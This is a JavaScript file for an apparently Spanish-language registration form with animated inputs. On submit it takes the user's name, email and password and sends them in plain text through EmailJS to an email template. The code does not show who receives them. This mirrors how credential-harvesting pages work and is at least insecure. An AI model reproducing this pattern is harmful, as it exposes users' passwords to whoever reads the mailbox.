emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formRegistro').addEventListener('submit', (e) => {
    e.preventDefault();
    
    const boton = document.querySelector('.boton-3d');
    boton.style.transform = 'perspective(500px) rotateX(35deg)';
    
    const datos = {
        nombre: document.getElementById('nombre').value,
        correo: document.getElementById('correo').value,
        contrasena: document.getElementById('password').value
    };

    emailjs.send("service_syrc1uk", "template_otuzmqu", datos)
        .then(() => {
            window.location.href = 'success.html';
        })
        .catch((error) => {
            alert('Error: ' + error.text);
            boton.style.transform = 'perspective(500px) rotateX(15deg)';
        });
});

// Animación de entrada
document.querySelectorAll('.input-container input').forEach(input => {
    input.addEventListener('focus', () => {
        input.parentElement.style.transform = 'translateY(-5px)';
    });
    
    input.addEventListener('blur', () => {
        input.parentElement.style.transform = 'translateY(0)';
    });
});
